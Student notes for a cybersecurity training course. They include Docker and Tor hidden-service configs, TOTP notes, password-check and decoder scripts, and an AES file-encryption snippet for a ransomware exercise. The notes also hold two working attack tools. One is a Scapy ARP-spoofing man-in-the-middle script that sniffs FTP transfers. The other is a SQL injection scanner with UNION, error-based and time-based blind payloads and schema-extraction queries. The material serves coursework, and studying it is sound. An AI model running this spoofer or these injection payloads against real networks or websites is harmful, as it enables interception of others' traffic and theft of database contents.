# Cybersecurity Piscine

Python


Docker compose


Dockerfile
```
FROM debian:bookworm

RUN apt-get update && apt-get install dpkg --add-architecture i386 && apt-get update
# install 32-bit libraries
RUN apt-get install -y libc6:i386 \
                            gdb \
                            build-essential
RUN apt-get install -y gcc-multilib
# compile gcc -m32 source.c -o source

CMD [ "tail", "-f", "/dev/null" ]
```


docker-compose.yaml
```
version: '3.8'

services:
  reverseme:
    container_name: reverseme
    build:
      context: .
      dockerfile: Dockerfile
    volumes:
      - /Users/kanykei/Desktop/cybersecurity-piscine/reverseme/srcs:/app
    restart: unless-stopped

```


## Cybersecurity - arachnida - Web

Pillow

## Cybersecurity - ft_otp - OTP

TOTP-Protokoll (RFC 6238)
import os          # Dateisystemoperationen
import hmac        # für HMAC-Implementierung
import time        # für Zeitberechnung
import rsa        # RSA-Verschlüsselung
import qrcode     # QR-Code Generierung
import tkinter    # für die GUI
PEM format

ft_otp/
├── src/
│   ├── __init__.py
│   ├── totp.py        # TOTP-Implementierung
│   ├── security.py    # Sicherheitsfunktionen
│   └── interface.py   # GUI (optional)
├── tests/
│   ├── test_totp.py
│   └── test_security.py
├── requirements.txt
├── README.md
└── ft_otp.py         # Hauptprogramm

https://itsecblog.de/2fa-zwei-faktor-authentifizierung-mit-totp/#:~:text=Das%20TOTP%20Verfahren%20wurde%202011,der%20aktuellen%20Uhrzeit%20gehasht%20wird.

## Cybersecurity - ft_onion - Web
I'll help you understand what you need to know to implement this Tor hidden service project. Here are the key components and skills required:

Basic Understanding of Tor Network:


Tor (The Onion Router) is a network for anonymous communication
.onion addresses are special domains used in the Tor network
Basic concept of how Tor hidden services work


Docker Knowledge:


Basic Docker commands
Understanding of Dockerfile creation
Container management (build, run, logs)


Web Server (Nginx):


Basic Nginx configuration
Setting up a static website
Port configurations
Understanding of virtual hosts


SSH Server:


SSH server configuration (sshd_config)
Public key authentication
Port configuration


Required Files:

Let me create a basic structure for each required file:
Tor Hidden Service Configuration FilesClick to open code

Implementation Steps:
Create project structure:

Copyft_onion/
├── Dockerfile
├── nginx.conf
├── torrc
├── sshd_config
├── index.html
└── secrets/
    └── id_rsa.pub

Generate SSH key pair if you don't have one:

bashCopyssh-keygen -t rsa -b 4096

Copy your public key to the secrets folder:

bashCopycp ~/.ssh/id_rsa.pub secrets/

Build and run the container as specified in the instructions:

bashCopydocker build -t somedevv/ft_onion .
docker run -d -p 80:80 -p 4242:4242 --name ft_onion somedevv/ft_onion

Check the container logs for the .onion address:

bashCopydocker logs ft_onion
The main challenges you might face:

Proper permissions for SSH and Tor directories
Correct configuration of services to work together
Understanding how to access the .onion address through Tor browser

```
# Dockerfile
FROM debian:bullseye-slim

# Install required packages
RUN apt-get update && apt-get install -y \
    nginx \
    tor \
    ssh \
    && rm -rf /var/lib/apt/lists/*

# Create required user and directories
RUN useradd -m -s /bin/bash sshuser
RUN mkdir -p /var/lib/tor/hidden_service/

# Copy configuration files
COPY nginx.conf /etc/nginx/nginx.conf
COPY torrc /etc/tor/torrc
COPY sshd_config /etc/ssh/sshd_config
COPY index.html /var/www/html/index.html
COPY secrets/id_rsa.pub /home/sshuser/.ssh/authorized_keys

# Set proper permissions
RUN chown -R debian-tor:debian-tor /var/lib/tor/
RUN chmod 700 /home/sshuser/.ssh
RUN chmod 600 /home/sshuser/.ssh/authorized_keys
RUN chown -R sshuser:sshuser /home/sshuser/.ssh

# Generate SSH host keys
RUN ssh-keygen -A

# Expose ports
EXPOSE 80 4242

# Start services
CMD service tor start && service ssh start && nginx -g 'daemon off;'

# nginx.conf
user www-data;
worker_processes auto;
pid /run/nginx.pid;

events {
    worker_connections 768;
}

http {
    sendfile on;
    tcp_nopush on;
    tcp_nodelay on;
    keepalive_timeout 65;
    types_hash_max_size 2048;

    include /etc/nginx/mime.types;
    default_type application/octet-stream;

    server {
        listen 80;
        root /var/www/html;
        index index.html;

        location / {
            try_files $uri $uri/ =404;
        }
    }
}

# torrc
HiddenServiceDir /var/lib/tor/hidden_service/
HiddenServicePort 80 127.0.0.1:80
HiddenServicePort 4242 127.0.0.1:4242

# sshd_config
Port 4242
PermitRootLogin no
PubkeyAuthentication yes
PasswordAuthentication no
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem sftp /usr/lib/openssh/sftp-server

# index.html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ft_onion</title>
</head>
<body>
    <h1>Welcome to my Tor Hidden Service!</h1>
    <p>This is a simple static webpage served through the Tor network.</p>
</body>
</html>
```

## Cybersecurity - Reverse me - Rev

```
getpass and hashlib
```

```
# Einfache Version (ähnlich zum C-Programm)
def simple_check():
    password = "__stack_check"
    user_input = input("Please enter key: ")

    if user_input == password:
        print("Good job.")
    else:
        print("Nope.")

# Sicherere Version mit getpass und Hashvergleich
import getpass
import hashlib

def secure_check():
    # Das gehashte Passwort (für "__stack_check")
    stored_hash = "8dc9723c07eb3d07d6242185fb40e4d49388004a9fd4c9a4c56dd512555e42d3"

    # Passwort versteckt einlesen
    user_input = getpass.getpass("Please enter key: ")

    # Hash der Eingabe erzeugen
    input_hash = hashlib.sha256(user_input.encode()).hexdigest()

    # Vergleich der Hashes
    if input_hash == stored_hash:
        print("Good job.")
    else:
        print("Nope.")

# Version mit Zeitlimit und maximalen Versuchen
import time
from functools import wraps

def limited_attempts(max_attempts=3, timeout=1):
    def decorator(func):
        attempts = {"count": 0, "last_try": 0}

        @wraps(func)
        def wrapper(*args, **kwargs):
            # Prüfen ob Zeitlimit seit letztem Versuch abgelaufen
            current_time = time.time()
            if current_time - attempts["last_try"] < timeout:
                print(f"Please wait {timeout} seconds between attempts.")
                return False

            # Prüfen ob maximale Versuche erreicht
            if attempts["count"] >= max_attempts:
                print("Maximum attempts reached. Please try again later.")
                return False

            attempts["count"] += 1
            attempts["last_try"] = current_time

            return func(*args, **kwargs)
        return wrapper
    return decorator

@limited_attempts(max_attempts=3, timeout=1)
def secure_password_check():
    stored_hash = "8dc9723c07eb3d07d6242185fb40e4d49388004a9fd4c9a4c56dd512555e42d3"
    user_input = getpass.getpass("Please enter key: ")
    input_hash = hashlib.sha256(user_input.encode()).hexdigest()

    if input_hash == stored_hash:
        print("Good job.")
        return True
    else:
        print("Nope.")
        return False

# Hauptprogramm mit Menü
def main():
    print("Choose version to run:")
    print("1. Simple check")
    print("2. Secure check")
    print("3. Limited attempts check")

    choice = input("Enter choice (1-3): ")

    if choice == "1":
        simple_check()
    elif choice == "2":
        secure_check()
    elif choice == "3":
        while True:
            if not secure_password_check():
                break
    else:
        print("Invalid choice")

if __name__ == "__main__":
    main()
```


```
def decode_password2(encoded):
    """Decode password from source 2.c format"""
    if not encoded.startswith('00'):
        return None

    result = 'd'  # Hardcoded first character
    nums = [encoded[i:i+3] for i in range(2, len(encoded), 3)]
    for num in nums:
        if len(num) == 3:
            result += chr(int(num))
    return result

def decode_password3(encoded):
    """Decode password from source 3.c format"""
    if not encoded.startswith('42'):
        return None

    result = '*'  # Hardcoded first character
    nums = [encoded[i:i+3] for i in range(2, len(encoded), 3)]
    for num in nums:
        if len(num) == 3:
            result += chr(int(num))
    return result

def encode_string(text, prefix):
    """Encode a string into the numeric format"""
    result = prefix
    for char in text:
        result += f"{ord(char):03d}"
    return result

# Test functions
def test_passwords():
    print("Testing Password 2:")
    encoded2 = "00101108097098101114101"
    decoded2 = decode_password2(encoded2)
    print(f"Encoded: {encoded2}")
    print(f"Decoded: {decoded2}")
    print(f"Re-encoded: {encode_string(decoded2, '00')}")

    print("\nTesting Password 3:")
    encoded3 = "42042042042042042042042042"
    decoded3 = decode_password3(encoded3)
    print(f"Encoded: {encoded3}")
    print(f"Decoded: {decoded3}")
    print(f"Re-encoded: {encode_string(decoded3, '42')}")

if __name__ == "__main__":
    test_passwords()
```

## Cybersecurity - Stockholm - Malware

```
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

class AESExample:
    def __init__(self):
        # AES-128 verwendet einen 16-Byte Schlüssel
        self.key = get_random_bytes(16)

    def encrypt_data(self, data):
        """Demonstriert AES Verschlüsselung im EAX-Modus"""
        # Erstelle neuen Cipher im EAX-Modus
        cipher = AES.new(self.key, AES.MODE_EAX)

        # Speichere nonce (number used once) für Entschlüsselung
        nonce = cipher.nonce

        # Verschlüssele Daten und erstelle MAC (Message Authentication Code)
        ciphertext, tag = cipher.encrypt_and_digest(data)

        return {
            'nonce': nonce,      # Wird für Entschlüsselung benötigt
            'ciphertext': ciphertext,  # Verschlüsselte Daten
            'tag': tag          # Für Integritätsprüfung
        }

    def decrypt_data(self, encrypted_data):
        """Demonstriert AES Entschlüsselung"""
        # Rekonstruiere Cipher mit original nonce
        cipher = AES.new(self.key, AES.MODE_EAX, nonce=encrypted_data['nonce'])

        # Entschlüssele und verifiziere Integrität
        try:
            plaintext = cipher.decrypt_and_verify(
                encrypted_data['ciphertext'],
                encrypted_data['tag']
            )
            return plaintext
        except ValueError:
            # Wird ausgelöst wenn Daten manipuliert wurden
            return None

# Beispiel für sicheres Datei-Handling
def secure_file_encryption(input_file, output_file, key):
    """Sicheres Verschlüsseln einer Datei"""
    # Lese Datei in Chunks für große Dateien
    CHUNK_SIZE = 64 * 1024  # 64KB chunks

    cipher = AES.new(key, AES.MODE_EAX)

    with open(input_file, 'rb') as f_in, open(output_file, 'wb') as f_out:
        # Schreibe nonce
        f_out.write(cipher.nonce)

        # Verarbeite Datei in Chunks
        while True:
            chunk = f_in.read(CHUNK_SIZE)
            if len(chunk) == 0:
                break
            # Verschlüssele chunk
            encrypted_chunk = cipher.encrypt(chunk)
            f_out.write(encrypted_chunk)

        # Schreibe MAC am Ende
        f_out.write(cipher.digest())
```

## (Optional) Cybersecurity - Iron Dome - Malware

...

## Cybersecurity - Inquisitor - Network

```
#!/usr/bin/env python3
import sys
import time
import argparse
from scapy.all import *
from scapy.layers.l2 import ARP, Ether
from scapy.layers.inet import IP, TCP
import threading

class ARPSpoofer:
    def __init__(self, ip_src, mac_src, ip_target, mac_target):
        self.ip_src = ip_src
        self.mac_src = mac_src
        self.ip_target = ip_target
        self.mac_target = mac_target
        self.stop_threads = False

    def restore_arp_tables(self):
        """Stellt die originalen ARP-Tabellen wieder her"""
        print("\nWiederherstellung der ARP-Tabellen...")

        # Sende korrekte ARP-Einträge
        restore_src = ARP(
            op=2,
            psrc=self.ip_target,
            hwsrc=self.mac_target,
            pdst=self.ip_src,
            hwdst=self.mac_src
        )

        restore_target = ARP(
            op=2,
            psrc=self.ip_src,
            hwsrc=self.mac_src,
            pdst=self.ip_target,
            hwdst=self.mac_target
        )

        # Sende mehrmals zur Sicherstellung
        send(restore_src, count=3, verbose=False)
        send(restore_target, count=3, verbose=False)

    def arp_spoof(self):
        """Führt ARP-Spoofing durch"""
        # Erstelle gefälschte ARP-Pakete
        arp_src = ARP(
            op=2,
            psrc=self.ip_target,
            hwdst=self.mac_src,
            pdst=self.ip_src
        )

        arp_target = ARP(
            op=2,
            psrc=self.ip_src,
            hwdst=self.mac_target,
            pdst=self.ip_target
        )

        print("Starting ARP spoofing...")

        while not self.stop_threads:
            try:
                # Sende gefälschte ARP-Pakete
                send(arp_src, verbose=False)
                send(arp_target, verbose=False)
                time.sleep(1)
            except Exception as e:
                print(f"Error during ARP spoofing: {e}")
                break

    def packet_sniffer(self):
        """Überwacht FTP-Datenverkehr"""
        def process_packet(packet):
            if packet.haslayer(TCP) and packet.haslayer(Raw):
                # Filtere FTP-Befehle
                payload = packet[Raw].load.decode('utf-8', errors='ignore')
                if any(cmd in payload for cmd in ['STOR ', 'RETR ']):
                    filename = payload.split(' ')[1].strip()
                    print(f"FTP File Transfer: {filename}")

        try:
            # Sniffe Pakete zwischen Source und Target
            sniff(
                filter=f"host {self.ip_src} and host {self.ip_target}",
                prn=process_packet,
                stop_filter=lambda _: self.stop_threads
            )
        except Exception as e:
            print(f"Error during packet sniffing: {e}")

    def start_attack(self):
        """Startet den Angriff"""
        # Starte ARP-Spoofing Thread
        spoof_thread = threading.Thread(target=self.arp_spoof)
        spoof_thread.start()

        # Starte Packet-Sniffer Thread
        sniffer_thread = threading.Thread(target=self.packet_sniffer)
        sniffer_thread.start()

        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\nStopping attack...")
            self.stop_threads = True
            spoof_thread.join()
            sniffer_thread.join()
            self.restore_arp_tables()

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("ip_src", help="IP-src")
    parser.add_argument("mac_src", help="MAC-src")
    parser.add_argument("ip_target", help="IP-target")
    parser.add_argument("mac_target", help="MAC-target")

    args = parser.parse_args()

    spoofer = ARPSpoofer(
        args.ip_src,
        args.mac_src,
        args.ip_target,
        args.mac_target
    )
    spoofer.start_attack()

if __name__ == "__main__":
    main()
```

## Cybersecurity - Vaccine - Web

```
#!/usr/bin/env python3
import requests
import argparse
import re
import time
import urllib.parse
from typing import List, Dict, Optional
import json
import logging

class SQLInjectionTester:
    def __init__(self, url: str, output_file: str = "results.txt",
                 request_type: str = "GET", cookie: str = None,
                 user_agent: str = None):
        self.url = url
        self.output_file = output_file
        self.request_type = request_type
        self.cookie = cookie
        self.user_agent = user_agent or "Mozilla/5.0"
        self.session = requests.Session()
        self.logger = self._setup_logger()

    def _setup_logger(self):
        """Konfiguriert Logging"""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        return logging.getLogger('SQLInjectionTester')

    def _make_request(self, payload: str) -> requests.Response:
        """Sendet HTTP Request mit SQL Injection Payload"""
        headers = {
            'User-Agent': self.user_agent
        }
        if self.cookie:
            headers['Cookie'] = self.cookie

        try:
            if self.request_type == "GET":
                # Füge Payload zu URL-Parametern hinzu
                parsed_url = urllib.parse.urlparse(self.url)
                params = urllib.parse.parse_qs(parsed_url.query)

                # Füge Payload zu jedem Parameter hinzu
                for param in params:
                    params[param] = [payload]

                new_query = urllib.parse.urlencode(params, doseq=True)
                new_url = urllib.parse.urlunparse((
                    parsed_url.scheme,
                    parsed_url.netloc,
                    parsed_url.path,
                    parsed_url.params,
                    new_query,
                    parsed_url.fragment
                ))

                return self.session.get(new_url, headers=headers)
            else:
                # POST Request mit Payload in Body
                return self.session.post(self.url, data={'input': payload}, headers=headers)

        except requests.RequestException as e:
            self.logger.error(f"Request failed: {e}")
            return None

    def detect_dbms(self) -> str:
        """Erkennt verwendetes Datenbanksystem"""
        tests = {
            'MySQL': [
                "AND extractvalue(rand(),concat(0x3a,version()))",
                "AND (SELECT 2*IF((SELECT * FROM (SELECT CONCAT(0x7e,version(),0x7e))",
            ],
            'PostgreSQL': [
                "AND (SELECT current_database())",
                "AND (SELECT version())",
            ],
            'MSSQL': [
                ";SELECT @@version",
                ";SELECT DB_NAME()",
            ],
            'Oracle': [
                "AND ROWNUM=1",
                "AND 1=UTL_INADDR.get_host_address((SELECT banner FROM v$version WHERE rownum=1))",
            ],
            'SQLite': [
                "AND sqlite_version()",
                "AND typeof('x')",
            ]
        }

        for dbms, payloads in tests.items():
            for payload in payloads:
                response = self._make_request(payload)
                if response and self._check_dbms_response(response.text, dbms):
                    return dbms
        return "Unknown"

    def _check_dbms_response(self, response: str, dbms: str) -> bool:
        """Überprüft Response auf DBMS-spezifische Merkmale"""
        indicators = {
            'MySQL': ['mysql', 'MariaDB'],
            'PostgreSQL': ['postgresql', 'pgsql'],
            'MSSQL': ['microsoft', 'sqlserver'],
            'Oracle': ['oracle', 'ORA-'],
            'SQLite': ['sqlite']
        }

        return any(ind.lower() in response.lower() for ind in indicators[dbms])

    def test_union_injection(self) -> List[str]:
        """Testet UNION-basierte SQL Injection"""
        union_payloads = [
            " UNION SELECT NULL--",
            " UNION SELECT NULL,NULL--",
            " UNION SELECT NULL,NULL,NULL--",
            " UNION ALL SELECT NULL--",
            " UNION ALL SELECT NULL,NULL--",
            " UNION ALL SELECT NULL,NULL,NULL--"
        ]

        vulnerable_params = []
        for payload in union_payloads:
            response = self._make_request(payload)
            if response and self._check_union_success(response.text):
                vulnerable_params.append(payload)
        return vulnerable_params

    def test_error_injection(self) -> List[str]:
        """Testet Error-basierte SQL Injection"""
        error_payloads = [
            "'",
            "\"",
            "\\",
            "1'",
            "1\"",
            "1\\",
            "1 OR '1'='1",
            "1' OR '1'='1",
            "1\" OR \"1\"=\"1",
            "1')) OR (('x'='x"
        ]

        vulnerable_params = []
        for payload in error_payloads:
            response = self._make_request(payload)
            if response and self._check_error_success(response.text):
                vulnerable_params.append(payload)
        return vulnerable_params

    def test_blind_injection(self) -> List[str]:
        """Testet Blind SQL Injection"""
        blind_payloads = [
            "1' AND SLEEP(5)--",
            "1' AND BENCHMARK(5000000,ENCODE('MSG','by 5 seconds'))--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "1' AND (SELECT COUNT(*) FROM generated_table)>0--",
        ]

        vulnerable_params = []
        for payload in blind_payloads:
            start_time = time.time()
            response = self._make_request(payload)
            duration = time.time() - start_time

            if duration > 5:  # Time-based detection
                vulnerable_params.append(payload)
        return vulnerable_params

    def extract_data(self, dbms: str) -> Dict:
        """Extrahiert Datenbankinformationen"""
        data = {
            'databases': [],
            'tables': [],
            'columns': [],
        }

        # DBMS-spezifische Extraktions-Payloads
        extraction_queries = {
            'MySQL': {
                'databases': "UNION SELECT schema_name FROM information_schema.schemata--",
                'tables': "UNION SELECT table_name FROM information_schema.tables--",
                'columns': "UNION SELECT column_name FROM information_schema.columns--"
            },
            'PostgreSQL': {
                'databases': "UNION SELECT datname FROM pg_database--",
                'tables': "UNION SELECT tablename FROM pg_tables--",
                'columns': "UNION SELECT column_name FROM information_schema.columns--"
            }
            # Weitere DBMS können hier hinzugefügt werden
        }

        if dbms in extraction_queries:
            for data_type, query in extraction_queries[dbms].items():
                response = self._make_request(query)
                if response:
                    data[data_type] = self._parse_extraction_response(response.text)

        return data

    def _parse_extraction_response(self, response: str) -> List[str]:
        """Parst extrahierte Daten aus der Response"""
        # Implementiere Response-Parsing basierend auf der Struktur
        # Dies ist stark von der Anwendung abhängig
        return []

    def save_results(self, results: Dict):
        """Speichert Testergebnisse"""
        try:
            with open(self.output_file, 'w') as f:
                json.dump(results, f, indent=4)
            self.logger.info(f"Results saved to {self.output_file}")
        except IOError as e:
            self.logger.error(f"Error saving results: {e}")

    def run_tests(self):
        """Führt alle Tests aus"""
        results = {
            'url': self.url,
            'dbms': None,
            'vulnerabilities': {
                'union': [],
                'error': [],
                'blind': []
            },
            'extracted_data': {}
        }

        # Erkenne DBMS
        results['dbms'] = self.detect_dbms()
        self.logger.info(f"Detected DBMS: {results['dbms']}")

        # Führe Tests aus
        results['vulnerabilities']['union'] = self.test_union_injection()
        results['vulnerabilities']['error'] = self.test_error_injection()
        results['vulnerabilities']['blind'] = self.test_blind_injection()

        # Extrahiere Daten wenn verwundbar
        if any(results['vulnerabilities'].values()):
            results['extracted_data'] = self.extract_data(results['dbms'])

        # Speichere Ergebnisse
        self.save_results(results)
        return results

def main():
    parser = argparse.ArgumentParser(description='SQL Injection Testing Tool')
    parser.add_argument('url', help='Target URL')
    parser.add_argument('-o', '--output', help='Output file', default='results.txt')
    parser.add_argument('-X', '--request-type', help='Request type', default='GET')
    parser.add_argument('-c', '--cookie', help='Login cookie')
    parser.add_argument('-u', '--user-agent', help='User-Agent string')

    args = parser.parse_args()

    tester = SQLInjectionTester(
        url=args.url,
        output_file=args.output,
        request_type=args.request_type,
        cookie=args.cookie,
        user_agent=args.user_agent
    )

    results = tester.run_tests()

if __name__ == "__main__":
    main()
```
